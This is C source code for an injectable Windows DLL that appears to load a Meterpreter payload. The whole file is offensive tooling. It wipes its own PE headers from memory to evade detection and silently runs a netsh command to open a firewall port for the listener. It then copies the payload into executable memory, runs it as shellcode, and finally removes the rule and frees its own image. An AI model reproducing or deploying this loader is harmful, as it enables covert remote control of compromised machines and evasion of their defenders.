#include "stdafx.h"

#include "../meterpreter_config.h"

#pragma comment(linker,"/ENTRY:DllMain")
#pragma comment(linker,"/NODEFAULTLIB")
//--------------------------------------------------------------------------------------
DWORD WINAPI ShellcodeThread(LPVOID lpParam)
{
    typedef DWORD (WINAPI * SHELLCODE)(void);       
    SHELLCODE Shellcode = (SHELLCODE)lpParam;

    // call shellcode
    return Shellcode();        
}
//--------------------------------------------------------------------------------------
DWORD WINAPI MainThread(LPVOID lpParam)
{
    DWORD dwExit = 0;

    DbgMsg(
        __FILE__, __LINE__, __FUNCTION__"(): Thread %x:%x started\n", 
        GetCurrentProcessId(), GetCurrentThreadId()
    );

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Adding firewall rule for TCP port %d...\n", LISTEN_PORT);

    // add firewall rule to allow connections on meterpreter port
    char szCommandLine[MAX_PATH];
    wsprintf(szCommandLine, "cmd.exe /C netsh firewall add portopening TCP %d " FIREWALL_RULE_NAME, LISTEN_PORT);
    UINT ExitCode = WinExec(szCommandLine, SW_HIDE);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Done (exit code: %d)\n", ExitCode);

    // allocate memory for shellcode
    PVOID Buff = VirtualAlloc(NULL, sizeof(PAYLOAD), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (Buff)
    {
        DbgMsg(
            __FILE__, __LINE__, __FUNCTION__"(): Allocated %d bytes for payload at 0x%x\n", 
            sizeof(PAYLOAD), Buff
        );

        // copy shellcode
        RtlCopyMemory(Buff, PAYLOAD, sizeof(PAYLOAD));

        // run payload in separate thread
        HANDLE hThread = CreateThread(NULL, 0, ShellcodeThread, Buff, 0, NULL);
        if (hThread)
        {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
        }

        VirtualFree(Buff, 0, MEM_RELEASE);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "VirtualAlloc() ERROR %d\n", GetLastError());
    }

    // delete firewall rule
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Deleting firewall rule...\n");
    ExitCode = WinExec("cmd.exe /C netsh advfirewall firewall delete rule name=" FIREWALL_RULE_NAME, SW_HIDE);
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Done (exit code: %d)\n", ExitCode);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): EXIT\n");

#ifdef _X86_

    // free DLL image and exit current thread
    __asm
    {
        push    dwExit /* argument for ExitThread() */
        push    MEM_RELEASE
        push    0
        push    lpParam /* address to free */
        push    dword ptr [ExitThread] /* ExitThread() as return address from VirtualFree() */
        mov     eax, dword ptr [VirtualFree]
        jmp     eax
    }

#else // _X86_

#error __FUNCTION__ is x86 only

#endif // _X86_

    return dwExit;
}
//--------------------------------------------------------------------------------------
void my_memset(void *mem, unsigned char val, size_t size)
{
    for (size_t i = 0; i < size; i++)
    {
        ((unsigned char *)mem)[i] = i;
    }

    for (size_t i = 0; i < size; i++)
    {
        ((unsigned char *)mem)[i] ^= i;
        ((unsigned char *)mem)[i] += val;
    }
}
//--------------------------------------------------------------------------------------
BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        {
            char szProcessPath[MAX_PATH], szProcessUser[MAX_PATH];
            DWORD dwUserLen = MAX_PATH;

            GetModuleFileName(GetModuleHandle(NULL), szProcessPath, MAX_PATH);
            GetUserName(szProcessUser, &dwUserLen);

            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__"(): Injected into process \"%s\" (PID=%d), User = \"%s\"\n",
                szProcessPath, GetCurrentProcessId(), szProcessUser
            );

            PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)
                ((PUCHAR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);

            DWORD dwOldProt = 0;
            if (VirtualProtect(hModule, pHeaders->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &dwOldProt))
            {
                // erase image headers
                my_memset(hModule, 0, pHeaders->OptionalHeader.SizeOfHeaders);
            }

            // run payload in separate thread
            HANDLE hThread = CreateThread(NULL, 0, MainThread, (PVOID)hModule, 0, NULL);
            if (hThread)
            {
                CloseHandle(hThread);
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
            }

            break;
        }

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        {
            break;
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
void Dummy(void)
{
    MessageBox(0, "<OK> to exit...", __FUNCTION__"()", MB_ICONINFORMATION);
    ExitProcess(0);
}
//--------------------------------------------------------------------------------------
// EoF
